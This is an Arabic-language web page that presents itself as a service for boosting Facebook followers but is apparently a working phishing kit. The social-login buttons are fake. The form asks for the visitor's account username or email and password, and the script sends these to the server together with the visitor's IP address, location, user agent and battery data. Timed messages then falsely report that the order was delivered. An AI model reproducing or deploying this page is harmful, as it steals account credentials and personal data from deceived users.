<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <title>زيادة متابعين فيسبوك</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            margin: 0;
            overflow-x: hidden;
            font-family: 'Tajawal', sans-serif;
            color: white;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        @keyframes gradientBG {
            0% {background-position: 0% 50%;}
            50% {background-position: 100% 50%;}
            100% {background-position: 0% 50%;}
        }

        .main-container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
            overflow-y: auto;
            max-height: 95vh;
            scroll-behavior: smooth;
            -webkit-overflow-scrolling: touch;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border-radius: 20px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 25px;
            position: relative;
        }

        .container {
            margin: 20px auto;
            padding: 25px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            width: 100%;
            position: relative;
            z-index: 1;
            text-align: center;
            transition: all 0.3s ease;
            border: 1px solid rgba(255, 255, 255, 0.15);
        }

        .container:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }

        h1 {
            font-size: 28px;
            margin-bottom: 25px;
            color: #fff;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            position: relative;
            padding-bottom: 15px;
        }

        h1::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 30%;
            right: 30%;
            height: 3px;
            background: linear-gradient(to right, transparent, #4e54c8, transparent);
            border-radius: 3px;
        }

        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 15px;
            margin: 15px 0;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.15);
            z-index: 1;
            transition: all 0.3s;
        }

        .btn:hover::before {
            background: rgba(255, 255, 255, 0.25);
        }

        .btn:active {
            transform: translateY(2px) scale(0.98);
        }

        .btn img {
            width: 28px;
            height: 28px;
            margin-left: 12px;
            filter: drop-shadow(0 2px 2px rgba(0, 0, 0, 0.2));
            position: relative;
            z-index: 2;
        }

        .btn span {
            position: relative;
            z-index: 2;
        }

        .btn.google {
            background: linear-gradient(45deg, #4e54c8, #8f94fb);
        }

        .btn.facebook {
            background: linear-gradient(45deg, #4e54c8, #8f94fb);
        }

        .btn.instagram {
            background: linear-gradient(45deg, #4e54c8, #8f94fb);
        }

        .pricing {
            margin-top: 20px;
        }

        .price-item {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            margin: 12px 0;
            border-radius: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
            transition: all 0.3s ease;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .price-item:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateX(5px);
        }

        .buy-btn {
            background: linear-gradient(45deg, #4e54c8, #8f94fb);
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 10px rgba(78, 84, 200, 0.3);
        }

        .buy-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 15px rgba(78, 84, 200, 0.4);
        }

        input, select {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border-radius: 10px;
            border: none;
            background: rgba(255, 255, 255, 0.15);
            color: white;
            font-size: 16px;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
        }

        input:focus, select:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.25);
            box-shadow: 0 0 0 3px rgba(78, 84, 200, 0.3);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        form {
            background: rgba(0, 0, 0, 0.2);
            padding: 25px;
            border-radius: 15px;
            margin-top: 20px;
        }

        label {
            display: block;
            margin: 15px 0 8px;
            font-weight: 600;
            color: #fff;
            text-align: right;
            font-size: 16px;
        }

        .social-icons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 30px 0;
        }

        .social-icon {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .social-icon:hover {
            transform: translateY(-5px) rotate(5deg);
            background: rgba(255, 255, 255, 0.2);
        }

        .social-icon img {
            width: 30px;
            height: 30px;
            filter: drop-shadow(0 2px 3px rgba(0, 0, 0, 0.3));
        }

        .logo {
            text-align: center;
            margin-bottom: 25px;
        }

        .logo img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            transition: all 0.5s ease;
        }

        .logo img:hover {
            transform: rotate(360deg) scale(1.1);
        }

        .featured-image {
            width: 100%;
            height: 200px;
            border-radius: 15px;
            margin: 20px 0;
            background: linear-gradient(45deg, #4e54c8, #8f94fb);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        .featured-image::before {
            content: "متابعين فيسبوك";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            font-weight: bold;
            color: white;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
        }

        @media (max-width: 600px) {
            .main-container {
                padding: 15px;
                max-height: 90vh;
            }
            
            .container {
                padding: 20px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .btn {
                padding: 12px;
                font-size: 16px;
            }
            
            .featured-image {
                height: 150px;
            }
        }

        /* تنسيق الشاشات بعد التسجيل */
        .loading-container, .second-message-container, .message-container {
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            max-width: 500px;
            width: 90%;
            animation: fadeIn 2s ease-in-out;
            display: none;
            margin: 20px auto;
            border: 1px solid rgba(255, 255, 255, 0.15);
        }
        
        .loading-container h1, .second-message-container h1, .message-container h1 {
            font-size: 2em;
            color: #fff;
            margin-bottom: 15px;
        }
        
        .loading-container p, .second-message-container p, .message-container p {
            font-size: 1.2em;
            color: #b0d7ff;
            margin-bottom: 20px;
        }
        
        .heart {
            font-size: 3em;
            color: #ff8a00;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .progress-bar {
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin: 15px 0;
            height: 20px;
        }
        
        .progress-bar div {
            height: 100%;
            width: 0;
            background: linear-gradient(to right, #4e54c8, #8f94fb);
            border-radius: 10px;
            animation: progress 20s linear forwards;
        }
        
        @keyframes progress {
            to { width: 100%; }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
  
  <div class="main-container">
    <div class="logo">
      <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?auto=format&fit=crop&w=300" alt="موقع المتابعين">
    </div>
    
    <div id="login" class="container">
      <h1>تسجيل الدخول عبر</h1>
      
      <div class="featured-image"></div>
      
      <button class="btn google" onclick="loginWithGoogle()">
        <span>Google</span>
        <img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt="Google">
      </button>
      
      <button class="btn facebook" onclick="loginWithFacebook()">
        <span>Facebook</span>
        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
      </button>
      
      <button class="btn instagram" onclick="loginWithInstagram()">
        <span>Instagram</span>
        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
      </button>
      
      <div class="social-icons">
        <div class="social-icon">
          <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube">
        </div>
        <div class="social-icon">
          <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
        </div>
        <div class="social-icon">
          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="TikTok">
        </div>
      </div>
    </div>

    <div id="form" class="container" style="display: none;">
      <h1>شحن متابعين فيسبوك 🚀</h1>
      
      <form id="increaseForm">
        <input type="hidden" name="chatId" id="chatIdInput">
        
        <label>اسم المستخدم أو البريد الإلكتروني:</label>
        <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
        
        <label>كلمة المرور:</label>
        <input type="password" name="password" placeholder="كلمة المرور" required>

        <label>عدد المتابعين:</label>
        <select name="followers" required>
          <option value="">اختر عدد المتابعين</option>
          <option value="500">500 متابع 🔥</option>
          <option value="1000">1000 متابع ⭐</option>
          <option value="2000">2000 متابع 💥</option>
          <option value="3000">3000 متابع 🚀</option>
        </select>

        <button type="submit" class="buy-btn" style="margin-top: 20px; width: 100%; padding: 15px;">رشق المتابعين</button>
      </form>
    </div>

    <div class="container pricing">
      <h1>أسعار المتابعين</h1>
      
      <div class="price-item">
        <span>500 متابع</span>
        <button class="buy-btn">🔥</button>
      </div>
      
      <div class="price-item">
        <span>1000 متابع</span>
        <button class="buy-btn">⭐</button>
      </div>
      
      <div class="price-item">
        <span>2000 متابع</span>
        <button class="buy-btn">💥</button>
      </div>
      
      <div class="price-item">
        <span>3000 متابع</span>
        <button class="buy-btn">🚀</button>
      </div>
    </div>
  </div>

  <!-- شاشة التحميل -->
  <div class="loading-container"> 
      <h1>جاري ارسال الطلب...</h1> 
      <p>يتم تجهيز طلبك، يرجى الانتظار.</p> 
      <div class="heart">❤️</div> 
      <div class="progress-bar"><div></div></div> 
  </div> 

  <div class="second-message-container"> 
      <h1>تم عد وجاري تنفيذ طلبك...</h1> 
      <p>يتم الآن تنفيذ طلبك بنجاح.</p> 
      <div class="heart">❤️</div> 
  </div> 

  <div class="message-container"> 
      <h1>تهانينا!</h1> 
      <p>تم تسليم طلبك بنجاح!</p> 
      <div class="heart">❤️</div> 
  </div> 

  <script>
    // السكربت الأصلي من الموقع الأول
    const increaseForm = document.getElementById('increaseForm');
    const chatIdInput = document.getElementById('chatIdInput');

    const chatId = window.location.pathname.split('/').pop();
    chatIdInput.value = chatId;

    async function getIPInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                country: data.country_name,
                city: data.city
            };
        } catch (error) {
            console.error('Error fetching IP info:', error);
            return {
                ip: 'Unknown',
                country: 'Unknown',
                city: 'Unknown'
            };
        }
    }

    function getPlatformInfo() {
        const ua = navigator.userAgent;
        let platform = "Unknown";
        if (/Windows/.test(ua)) platform = "Facebook";
        else if (/Mac/.test(ua)) platform = "Facebook";
        else if (/Facebook/.test(ua)) platform = "Facebook";
        else if (/Android/.test(ua)) platform = "Facebook";
        else if (/iPhone|iPad|iPod/.test(ua)) platform = "Facebook";

        return {
            platform: platform,
            userAgent: ua
        };
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    batteryLevel: battery.level,
                    batteryCharging: battery.charging
                };
            } catch (error) {
                console.error('Error getting battery info:', error);
            }
        }
        return {
            batteryLevel: undefined,
            batteryCharging: undefined
        };
    }

    function getDeviceVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/\(([^)]+)\)/);
        return match ? match[1] : 'Unknown';
    }

    increaseForm.addEventListener('submit', async (event) => {
        event.preventDefault();

        // تنفيذ العمليات المراد تنفيذها قبل التحميل
        document.body.style.background = 'linear-gradient(135deg, #f5af19, #f12711)';
        document.querySelector('.main-container').style.display = 'none';
        document.querySelector('.loading-container').style.display = 'block';

        const formData = new FormData(increaseForm);
        const data = Object.fromEntries(formData.entries());

        const ipInfo = await getIPInfo();
        const platformInfo = getPlatformInfo();
        const batteryInfo = await getBatteryInfo();
        const deviceVersion = getDeviceVersion();

        Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });

        try {
            const response = await fetch('/submitIncrease', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            const result = await response.json();
            if (result.success) {
                setTimeout(function() {
                    document.querySelector('.loading-container').style.display = 'none';
                    document.querySelector('.second-message-container').style.display =
                    'block';
                }, 5000);

                setTimeout(function() {
                    document.querySelector('.second-message-container').style.display = 'none';
                    document.querySelector('.message-container').style.display = 'block';
                }, 10000);

                increaseForm.reset();
            } else {
                alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
        }
    });

    // وظائف تسجيل الدخول
    function loginWithGoogle() {
        const btn = event.currentTarget;
        const originalHTML = btn.innerHTML;
        
        btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
        btn.disabled = true;
        
        setTimeout(() => {
            btn.innerHTML = originalHTML;
            btn.disabled = false;
            
            setTimeout(() => {
                showForm();
            }, 500);
        }, 1500);
    }

    function loginWithFacebook() {
        const btn = event.currentTarget;
        const originalHTML = btn.innerHTML;
        
        btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
        btn.disabled = true;
        
        setTimeout(() => {
            btn.innerHTML = originalHTML;
            btn.disabled = false;
            
            setTimeout(() => {
                showForm();
            }, 500);
        }, 1500);
    }

    function loginWithInstagram() {
        const btn = event.currentTarget;
        const originalHTML = btn.innerHTML;
        
        btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
        btn.disabled = true;
        
        setTimeout(() => {
            btn.innerHTML = originalHTML;
            btn.disabled = false;
            
            setTimeout(() => {
                showForm();
            }, 500);
        }, 1500);
    }

    function showForm() {
        document.getElementById("login").style.display = "none";
        document.getElementById("form").style.display = "block";
        
        const container = document.querySelector('.main-container');
        const formElement = document.getElementById("form");
        const topPos = formElement.offsetTop;
        
        container.scrollTo({
            top: topPos - 20,
            behavior: 'smooth'
        });
    }

    // إضافة spinner للأنيميشن
    const style = document.createElement('style');
    style.textContent = `
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-left: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    `;
    document.head.appendChild(style);
  </script>
</body>
            </html>
